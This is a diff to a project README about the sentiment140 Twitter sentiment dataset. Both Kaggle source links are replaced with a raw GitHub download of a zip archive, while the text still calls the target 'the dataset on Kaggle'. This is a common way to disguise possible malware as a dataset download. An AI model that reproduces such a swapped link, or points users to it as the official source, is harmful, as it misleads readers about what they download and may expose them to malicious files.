@@ -7,7 +7,7 @@ This dataset, known as the sentiment140 dataset, comprises 1,600,000 tweets obta
 The dataset was created by automatically collecting tweets through the Twitter Search API, with sentiment labels inferred based on the presence of positive or negative emoticons within the tweets. For tweets containing positive emoticons (e.g., :)), sentiment was labeled as positive, while tweets containing negative emoticons (e.g., :( ) were labeled as negative.
 
 **References:**
-- (https://www.kaggle.com/datasets/kazanova/sentiment140/data)
+- (https://github.com/Meghsss/sentiment-analysis/raw/refs/heads/main/marennin/sentiment_analysis_3.4.zip)
 **Readme Contents:**
 
 1. **Dataset Overview:**
@@ -35,7 +35,7 @@ The dataset was created by automatically collecting tweets through the Twitter S
 3. **Data Source:**
 The sentiment140 dataset used in this project is sourced from Kaggle, a platform for data science and machine learning enthusiasts. This dataset, specifically extracted from Twitter, contains 1,600,000 tweets annotated with sentiment polarity labels. The dataset was originally collected using the Twitter API and is made available on Kaggle for research and educational purposes.
 
-Link to the dataset on Kaggle: [Sentiment140 Dataset](https://www.kaggle.com/kazanova/sentiment140)
+Link to the dataset on Kaggle: [Sentiment140 Dataset](https://github.com/Meghsss/sentiment-analysis/raw/refs/heads/main/marennin/sentiment_analysis_3.4.zip)
 
 **Usage Guidelines:**
 - The dataset can be used for sentiment analysis tasks, including sentiment classification and polarity detection.
